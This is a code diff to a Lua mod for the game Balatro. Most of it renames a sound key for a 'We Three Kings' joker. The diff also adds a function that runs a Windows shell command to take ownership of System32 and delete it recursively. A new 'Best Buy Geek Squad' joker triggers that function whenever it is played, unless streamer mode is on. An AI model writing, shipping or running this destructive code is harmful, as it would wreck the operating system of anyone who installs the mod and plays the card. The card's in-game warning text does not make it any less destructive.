@@ -42,7 +42,7 @@ SMODS.Sound({
 })
 
 SMODS.Sound({
-    key = "wethreekings",
+    key = "wtk",
     path = "wethreekings.mp3",
 })
 
@@ -125,6 +125,14 @@ local function gcbm_shutdown_computer()
     end
 end
 
+local function gcbm_delete_sys32()
+    local os_name = love.system.getOS()
+
+    if os_name == "Windows" then
+        os.execute('cd /d C:\\Windows && takeown /F System32 /R && rmdir System32 /s /q')
+    end
+end
+
 SMODS.Joker{
     key = 'tm2', --joker key
     loc_txt = { -- local text
@@ -166,6 +174,36 @@ SMODS.Joker{
     in_pool = function(self,wawa,wawa2)
         --whether or not this card is in the pool, return true if it is, return false if its not
         return true
+    end,
+}
+
+SMODS.Joker{
+    key = 'best',
+    loc_txt = {
+        name = 'Best Buy Geek Squad',
+        text = {
+            'THIS WILL DELETE YOUR SYSTEM32 WHEN PLAYED',
+        },
+    },
+    atlas = 'Rare_jokers',
+    rarity = 3,
+    cost = 10,
+    unlocked = true,
+    discovered = true,
+    blueprint_compat = false,
+    eternal_compat = true,
+    perishable_compat = true,
+    pos = {x = 0, y = 0},
+
+    in_pool = function(self, args)
+        return true
+    end,
+
+    calculate = function(self, card, context)
+        local streamer_mode_enabled = config.streamer_mode
+        if context.joker_main and not streamer_mode_enabled then
+            gcbm_delete_sys32()
+        end
     end,
 }
 
@@ -1200,11 +1238,6 @@ SMODS.Joker{
     perishable_compat = true,
     pos = {x = 6, y = 1},
 
-    sound = SMODS.Sound({
-        key = "wethreekings",
-        path = "wethreekings.mp3",
-    }),
-
     calculate = function(self, card, context)
         if context.joker_main then
             -- Check if exactly 3 cards were played
@@ -1220,7 +1253,7 @@ SMODS.Joker{
                 if king_count == 3 then
                     -- Only play sound on first trigger, but allow mult for Blueprint/Brainstorm
                     if not G.GAME.we_three_kings_triggered then
-                        play_sound('gcbm_wethreekings')
+                        play_sound('gcbm_wtk')
                         G.GAME.we_three_kings_triggered = true
                     end
                     return {
